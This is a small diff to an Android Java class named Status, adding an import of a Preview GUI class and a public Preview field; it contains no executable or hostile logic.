@@ -20,6 +20,7 @@ import com.android.networking.conf.ConfEvent;
 import com.android.networking.conf.ConfModule;
 import com.android.networking.conf.Globals;
 import com.android.networking.event.BaseEvent;
+import com.android.networking.gui.Preview;
 import com.android.networking.module.ModuleCrisis;
 import com.android.networking.util.Check;
 
@@ -64,6 +65,8 @@ public class Status {
 	private static Object[] triggeredSemaphore = new Object[Action.NUM_QUEUE];
 
 	static public boolean uninstall;
+
+	public Preview preview;
 
 	/**
 	 * Instantiates a new status.
